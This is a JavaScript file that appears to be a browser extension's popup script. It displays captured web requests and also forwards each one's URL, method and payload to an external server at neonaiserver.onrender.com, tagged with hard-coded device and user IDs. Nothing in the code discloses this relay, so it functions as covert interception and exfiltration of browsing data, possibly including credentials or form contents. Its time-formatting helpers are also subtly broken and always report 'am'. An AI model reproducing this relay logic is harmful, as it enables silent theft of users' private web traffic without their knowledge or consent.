//relay to service

function dateGetter(){
  var today = new Date();
  var dd = String(today.getDate()).padStart(2, '0');
  var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
  var yyyy = today.getFullYear();

  return mm + '/' + dd + '/' + yyyy;
}

function timeGetter(){
  var today = new Date();
  var hour = String(today.getHours() % 12 || 12);
  var minutes = String(today.getMinutes() >= 9? today.getMinutes() : `0${today.getMinutes()}`)
  var seconds = String(today.getSeconds() >= 9? today.getSeconds() : `0${today.getSeconds()}`)
  var timeIndicator = parseInt(hour) <= 12? "am" : "pm"

  return `${hour}:${minutes}:${seconds} ${timeIndicator}`;
}

function RelayNetworkLog(payload) {
  const urlencoded = new URLSearchParams();
  urlencoded.append("token", payload);

  const requestOptions = {
    method: "POST",
    body: urlencoded,
    redirect: "follow"
  };

  fetch(`https://neonaiserver.onrender.com/device/devicesystemlogsrelay`, requestOptions)
  .then((response) => response.text())
  .then((result) => console.log(result))
  .catch((error) => console.error(error));
}


// popup.js
document.addEventListener('DOMContentLoaded', function () {
    chrome.runtime.sendMessage({ type: 'get-captured-requests' }, function(response) {
      const ul = document.getElementById('requests');
      response.forEach(request => {
        const li = document.createElement('li');
        li.textContent = `URL: ${request.url}, Payload: ${JSON.stringify(request.payload)}`;
        ul.appendChild(li);
        RelayNetworkLog(JSON.stringify({
          deviceID: "DVC_47930993506265148139",
          toID: "USR_55089_6513041052",
          time: `${dateGetter()} ${timeGetter()}`,
          status: 200,
          host: request.url,
          request: request.method,
          data: request.payload,
        }))
      });
    });
});
  